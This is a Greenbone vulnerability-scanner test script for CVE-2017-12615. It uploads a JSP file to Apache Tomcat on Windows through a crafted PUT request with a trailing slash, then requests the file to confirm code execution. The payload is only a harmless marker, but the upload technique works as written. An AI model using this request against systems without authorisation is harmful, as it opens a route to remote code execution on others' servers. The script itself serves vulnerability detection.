# SPDX-FileCopyrightText: 2017 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:apache:tomcat";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.811845");
  script_version("2024-07-17T05:05:38+0000");
  script_xref(name:"CISA", value:"Known Exploited Vulnerability (KEV) catalog");
  script_xref(name:"URL", value:"https://www.cisa.gov/known-exploited-vulnerabilities-catalog");
  script_cve_id("CVE-2017-12615");
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2024-07-17 05:05:38 +0000 (Wed, 17 Jul 2024)");
  script_tag(name:"severity_vector", value:"CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2024-07-16 17:58:22 +0000 (Tue, 16 Jul 2024)");
  script_tag(name:"creation_date", value:"2017-09-25 17:29:27 +0530 (Mon, 25 Sep 2017)");
  script_tag(name:"qod_type", value:"exploit");
  script_name("Apache Tomcat 'HTTP PUT Request' Code Execution Vulnerability - Windows");

  script_tag(name:"summary", value:"Apache Tomcat is prone to a code execution vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted 'HTTP PUT' request and check
  whether it is able to upload arbitrary file or not.");

  script_tag(name:"insight", value:"The flaw is due to an insufficient processing
  of 'HTTP PUT Request', which allows uploading of an arbitrary JSP file to the
  target system and then request the file to execute arbitrary code on the target
  system.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote
  attackers to execute arbitrary code on the target system.");

  script_tag(name:"affected", value:"Apache Tomcat versions 7.0.0 to 7.0.79 on Windows");

  script_tag(name:"solution", value:"Upgrade to Tomcat version 7.0.81 or later.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_xref(name:"URL", value:"http://www.securitytracker.com/id/1039392");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/100901");
  script_xref(name:"URL", value:"http://tomcat.apache.org/security-7.html#Fixed_in_Apache_Tomcat_7.0.81");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2017 Greenbone AG");
  script_family("Web Servers");
  script_dependencies("gb_apache_tomcat_consolidation.nasl", "os_detection.nasl");
  script_mandatory_keys("apache/tomcat/http/detected", "Host/runs_windows");
  script_require_ports("Services/www", 8080);

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!get_app_location(cpe:CPE, port:port, nofork:TRUE))
  exit(0);

host = http_host_name(port:port);

postData = '<% out.println("Reproducing CVE-2017-12615");%>';

vtstrings = get_vt_strings();
rand = "/" + vtstrings["lowercase_rand"] + '.jsp';
url = rand + "/";

req = string("PUT ", url, " HTTP/1.1\r\n",
             "Host: ", host, "\r\n",
             "Content-Length: ", strlen(postData), "\r\n",
             "\r\n", postData);

res = http_keepalive_send_recv(port:port, data:req);

if(res =~ "^HTTP/1\.[01] 201")
{
  if( http_vuln_check(port:port, url:rand, pattern:"Reproducing CVE-2017-12615", check_header:TRUE))
  {
    report = 'It was possible to upload the file ' + rand + '. Please delete this file manually.\n\n';
    security_message(port:port, data:report);
    exit(0);
  }
}

exit(99);
